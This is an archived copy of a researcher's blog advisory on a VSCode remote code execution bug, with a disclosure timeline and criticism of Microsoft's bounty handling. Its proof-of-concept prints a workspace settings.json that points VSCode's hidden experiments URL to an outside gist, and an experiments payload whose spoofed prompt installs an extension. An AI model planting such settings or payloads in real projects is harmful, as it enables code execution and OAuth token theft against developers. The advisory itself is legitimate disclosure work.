---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-05-30_vscode-remote-code-execution-advisory.md
original_filename: 2023-05-30_vscode-remote-code-execution-advisory.md
title: VSCode Remote Code Execution advisory
category: documents
detected_topics:
- command-injection
- supply-chain
- oauth
- access-control
- xss
- otp
tags:
- imported
- documents
- command-injection
- supply-chain
- oauth
- access-control
- xss
- otp
language: en
raw_sha256: b993291acb3e854d316d158609d623721348aa9063b1524fe7cf61758cc80f97
text_sha256: 92afa8f64a56cacc65f0baa6520cd5c6b48c4862e80c602c17ed3e34b3b875ac
ingested_at: '2026-06-28T07:32:21Z'
sensitivity: unknown
redactions_applied: false
---

# VSCode Remote Code Execution advisory

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-05-30_vscode-remote-code-execution-advisory.md
- Source Type: markdown
- Detected Topics: command-injection, supply-chain, oauth, access-control, xss, otp
- Ingested At: 2026-06-28T07:32:21Z
- Redactions Applied: False
- Raw SHA256: `b993291acb3e854d316d158609d623721348aa9063b1524fe7cf61758cc80f97`
- Text SHA256: `92afa8f64a56cacc65f0baa6520cd5c6b48c4862e80c602c17ed3e34b3b875ac`


## Content

---
title: "VSCode Remote Code Execution advisory"
page_title: "VSCode Remote Code Execution advisory – Ammar's Blog"
url: "https://blog.ammaraskar.com/vscode-rce/"
final_url: "https://blog.ammaraskar.com/vscode-rce/"
authors: ["Ammar Askar"]
programs: ["Microsoft VSCode)"]
bugs: ["RCE", "Thick client", "Local Privilege Escalation"]
publication_date: "2023-05-30"
added_date: "2023-06-05"
source: "pentester.land/writeups.json"
original_index: 1105
---

# [VSCode Remote Code Execution advisory](//blog.ammaraskar.com/vscode-rce/ "VSCode Remote Code Execution advisory")

## May 30, 2023

__Reading time ~8 minutes

tl;dr I found a remote code execution bug in VSCode that can be triggered from untrusted workspaces. Microsoft fixed it but marked it as moderate severity and ineligible under their bug bounty program. Scroll to the proof-of-concept section if you want to skip the details.

# Background

Around two months ago, I was researching [github.dev](https://docs.github.com/en/codespaces/the-githubdev-web-based-editor), a lightweight web based editor for Github that uses vscode in the browser. I had gotten really into Github’s bug bounty program and vscode seemed like a fairly large attack surface to take a look at. During this time of digging around `github.dev`, I decided to take a look at bugs in vscode itself.

For those unfamiliar, vscode has a feature called [_Workspace Trust_](https://code.visualstudio.com/docs/editor/workspace-trust). When you open a folder, vscode will prompt you asking if you trust the authors of the files you are viewing. If you say no, vscode goes ahead and disables many of its features that could allow the workspace to cause automatic code execution.

![](/images/vscode/workspace-trust-dialog.png)

This includes things like [tasks](https://code.visualstudio.com/docs/editor/tasks) because an attacker could just make a task that executes a command with the [`runOn`](https://code.visualstudio.com/docs/editor/tasks#_run-behavior) setting set to `folderOpen`. Extensions get disabled unless the authors have explicitly marked their extension as being able to handle untrusted workspaces.

One other thing that gets disabled is _workspace settings_. Folders can specify settings specific to them in a `.vscode/settings.json` file. Just from looking in the wild, this can be used to control things like:

  * [Making .mdx files be treated as markdown](https://github.com/themefisher/pinwheel-astro/blob/61a5d85e74af0a0784c38f8a56a6b4e6bff0e9ec/.vscode/settings.json)
  * [Exclude folders from the built-in search](https://github.com/yuansfer/plugins-salesforce/blob/41e17ba64bf74ae66b92d239b954a4b209f8249b/.vscode/settings.json)
  * [Cause files be formatted on save](https://github.com/jessicacb12/basic-calculator/blob/450c0254bd40cd95771597cb27b33be14d5cb745/.vscode/settings.json)

However, these settings could potentially be dangerous. Consider for example, the `typescript.npm` setting, which controls the location of the `npm` executable. This controls an executable path therefore untrusted workspaces shouldn’t be allowed to set it. Extensions that mark themselves as capable of running in untrusted workspaces hence have to declare a [`restrictedConfigurations`](https://github.com/microsoft/vscode/blob/9f3c499c33813485c8f3c95359429c52a170f4c6/extensions/typescript-language-features/package.json#L21) field. This controls settings that can’t be set at the workspace level.

This got me to thinking, since vscode itself has built-in settings like `editor.fontFamily`, how are those handled in untrusted workspaces?

It turns out, the core of vscode itself uses a `.registerConfiguration` method where you have to explicitly pass `'restricted': true` in order to make a property not settable in an untrusted workspace.

Unlike the API for extensions, when vscode needs to retrieve the value of a setting it generally uses `configurationService.getValue('settings.key')`. The `settings.key` here doesn’t necessarily need to have been declared as part of `registerConfiguration` or in an extension’s declared settings. This got me to perform a search for all uses of `configurationService.getValue` in vscode and I found…

# The Bug: An undocumented setting

Just like any other tech company, Microsoft loves their A/B experiments and has chosen to [put them in vscode as well](https://code.visualstudio.com/docs/supporting/FAQ#_how-to-disable-experiments).

When I was searching for uses of configuration I stumbled upon this line:
  
  
  const experimentsUrl = this.configurationService
  .getValue<string>('_workbench.experimentsUrl') || this.productService.experimentsUrl;
  

inside of [`experimentService.ts`](https://github.com/microsoft/vscode/blob/8f5be1fd9b2987c7bf4e22edc65aca933e43c6ee/src/vs/workbench/contrib/experiments/common/experimentService.ts#L236)

This setting controls the url that vscode would fetch experiments from. Experiments usually need code to run so this seemed like a good avenue. I declared the setting in a `.vsocde/settings.json` file and got the following:

![](/images/vscode/undocumented-setting.png)

Looks like the setting was completely unregistered and hence was not marked as restricted! This meant that I could set it in an untrusted workspace. It was time to dive deeper on what vscode experiments could actually do.

I took a look at the default experiments url `https://vscodeexperiments.azureedge.net/experiments/vscode-experiments.json` and here is one of the example experiments:
  
  
  {
  "id": "copeet.jsDebugNodeInsiderPrompt",
  "enabled": true,
  "schemaVersion": 3,
  "condition": {
  "insidersOnly": true,
  ...
  "activationEvent": {
  "event": "onDebugResolve:node",
  "minEvents": 3
  }
  },
  "action2": {
  "type": "Prompt",
  "properties": {
  "promptText": "We're working on a new JavaScript debugger for VS Code. Would you like to try it out the next time you debug your program?",
  "commands": [
  {
  "text": "No Thanks"
  },
  {
  "text": "Enable",
  "codeCommand": {
  "id": "extension.js-debug.experimentEnlist",
  "arguments": []
  }
  }
  ]
  }
  }
  }
  

This experiment means that if a user is on the insider build of vscode and debugs node.js more than 3 times, a prompt shows up asking them to enlist in an experimental javascript debugger.

For reference, this is what it looks like when the experiment prompt shows up:

![](/images/vscode/prompt-example.png)

If they click `Enable` on the prompt, it issues the `extension.js-debug.experimentEnlist` command which presumably the javascript extension has declared and enlists them for the experiment.

This `codeCommand` was going to be our vector. `codeCommand` is a way to execute [commands](https://code.visualstudio.com/api/extension-guides/command) in vscode, this includes things like `git.stage` which asks the git extension to stage a file.

The attacker fully controls the prompt, its text and what command it issues. We could now make an official looking prompt show up and when dismissed, make it run arbitrary code.

# Proof-of-Concept

An attacker can host an `experiments.json` on a website, you can find the one I used on `gist.github.com` [here](https://gist.githubusercontent.com/ammaraskar/56b474d89fc1405582cf54aa34082b5a/raw/vscode-experiments2.json).

They can create a `.vscode/settings.json` file that contains
  
  
  {
  "_workbench.experimentsUrl": "https://gist.githubusercontent.com/ammaraskar/56b474d89fc1405582cf54aa34082b5a/raw/vscode-experiments2.json"
  }
  

and with the experiments file containing a malicious payload such as this:
  
  
  {
  "experiments": [
  {
  "id": "ammar2.test.experiment14",
  "enabled": true,
  "schemaVersion": 5,
  "action2": {
  "type": "Prompt",
  "properties": {
  "promptText": "[Welcome to VS Code. ...](command:workbench.extensions.installExtension?ms-vscode.hexeditor '.')",
  "commands": [
  {
  "text": "Continue",
  "codeCommand": {
  "id": "workbench.extensions.installExtension",
  "arguments": ["ms-vscode.hexeditor"]
  }
  }
  ]
  }
  }
  }
  ]
  }
  

The interesting things here are that the attacker fully controls the prompt text, they can make it look like a benign pop-up saying that vscode successfully updated or anything that will make the user click it.

Since markdown is supported in these pop-ups, they can also make the body of the text be clickable and perform a vscode command. All buttons are also controlled, so they could make both a _“No Thanks”_ and _“Yes”_ button both perform the attack.

When the victim opens the folder they are met with an official looking prompt from vscode like this:

![](/images/vscode/on-folder-open.png)

And if they click the body of the text or _“Continue”_ , it installs an attacker controlled extension.

![](/images/vscode/installed-extension.png)

This is an RCE because an extension in vscode has full access to the `node.js` api, it can simply use `child_process` to execute commands. An attacker can publish an extension with such functionality and have it do so at install time.

# Additional impact

While remote-code execution after opening a folder in vscode is bad enough, this gets a lot worse when you consider [github.dev](https://docs.github.com/en/codespaces/the-githubdev-web-based-editor)

This is a web vscode instance with a fairly generous `repo` scoped oauth token preloaded into it automatically by Github. If an attacker gets code-execution on github.dev, they can steal your oauth token. This lets them read all your repos, push to them on your behalf, change their settings etc.

# Timeline

  * **Apr 3, 2023** \- I report the bug on <https://msrc.microsoft.com/report/vulnerability/new>
  * **Apr 4, 2023** \- The bug is marked as being in the _Review/Repro_ stage.
  * **April 21, 2023** \- I ping about the bug mentioning the impact to github.dev and vscode.dev
  * **April 24, 2023** \- MSRC responds with some boilerplate about the case being assessed.
  * **May 24, 2023** \- The bug is fixed with this vscode commit: <https://github.com/microsoft/vscode/commit/800142c7dd47b5cf6047ef2c8f4c8440c6e244f6>
  * **May 24, 2023** \- MSRC marks the bug as being in the _Pre-Release_ stage.
  * **May 30, 2023** \- MSRC marks the bug as ineligible for their bug-bounty, their response is as follows.

> Thank you for taking the time to share your report. Based on the assessment from our engineering team, we have determined that your case 78793 is not eligible for an award under the Microsoft Bounty Programs. Your case may still be eligible for earning points under the MSRC Recognition Program.
> 
> Your case 78793 was assessed as follows:
> 
> Severity: Moderate Security Impact: Spoofing 
> 
> Thank you again for your submission! This report was marked as out of scope as the issue was assessed as having a moderate severity impact. Only cases assessed as important or critical are eligible for bounty.

Suffice it to say, this is not the response I wanted to see after they took 2 months to triage a remote code execution bug. A severity of moderate and an impact of spoofing dumbfounds me and hence I am making this disclosure public. The impact should be low as a new vscode release should be out on May 31.

# Microsoft security and vscode

I am hardly the first person to be alarmed by Microsoft’s handling of vscode bugs. I do not know if this is caused by the vscode team not taking security seriously or poor communication between MSRC and the vscode team but something clearly needs improvement here.

  * Back in September 2022, [zemnmez from Google also found an RCE](https://twitter.com/zemnmez/status/1562103677686407168) in vscode and Microsoft took 2 months to fix it while also considering it out of scope for their bug bounty.

* * *

Microsoft also has a policy whereby [bugs in extensions are ineligible for bug bounties.](https://www.microsoft.com/en-us/msrc/bounty-microsoft-azure)

>  * Vulnerabilities that rely on VSCode extensions
> 

This makes sense but for some reason they consider bugs even in first party extensions that **they literally ship in vscode** out of scope as well. Bugs such as

  * A command injection bug found in the in-built git extension by [SonarSource](https://www.sonarsource.com/blog/securing-developer-tools-argument-injection-in-vscode/) was considered ineligible by Microsoft.
  * Justin Steven’s [xss bug in the built-in Jupyter Notebook extension](https://github.com/justinsteven/advisories/blob/main/2021_vscode_ipynb_xss_arbitrary_file_read.md) was considered ineligible by Microsoft. You can read more about Steven’s misgivings with MSRC on their twitter thread [here](https://twitter.com/justinsteven/status/1516891095640477696).
  * Another bug I found in the first party [Github Repositories](https://marketplace.visualstudio.com/items?itemName=GitHub.remotehub) extension that would have allowed an attacker to steal your private repos by just having you click a link to github.com (I may write a follow-up blog post about this)

In the future, I am going with the public disclosure route for any vscode related bugs I find. I would encourage other security researchers to do the same until there is some improvement.

Working with MSRC on any vscode related security bugs has been dreadful. I hope someone from Microsoft security sees this and explains what happened and tries to make it right but I am certainly not holding out for it.

[security](//blog.ammaraskar.com/tags/#security "Pages tagged security")[advisory](//blog.ammaraskar.com/tags/#advisory "Pages tagged advisory")

  * [__Like](https://www.facebook.com/sharer/sharer.php?u=//blog.ammaraskar.com/vscode-rce/ "Share on Facebook")
  * [__Tweet](https://twitter.com/intent/tweet?text=//blog.ammaraskar.com/vscode-rce/ "Share on Twitter")
  * [__+1](https://plus.google.com/share?url=//blog.ammaraskar.com/vscode-rce/ "Share on Google Plus")

[Read More](//blog.ammaraskar.com/roku-tv-philips-hues/)

### [1-Click GitHub Token Stealing via a VSCode Bug](//blog.ammaraskar.com/github-token-stealing/ "1-Click GitHub Token Stealing via a VSCode Bug")

Just by clicking a link, it's possible for an attacker to steal a GitHubtoken that can read and **write** to your repos, including **priv...… [Continue reading](//blog.ammaraskar.com/github-token-stealing/)

#### [Hacking a Roku TV to Control Lights](//blog.ammaraskar.com/roku-tv-philips-hues/ "Hacking a Roku TV to Control Lights")

Published on May 18, 2021

#### [Reverse Engineering the iClicker Base Station](//blog.ammaraskar.com/iclicker-reverse-engineering/ "Reverse Engineering the iClicker Base Station")

Published on May 04, 2019
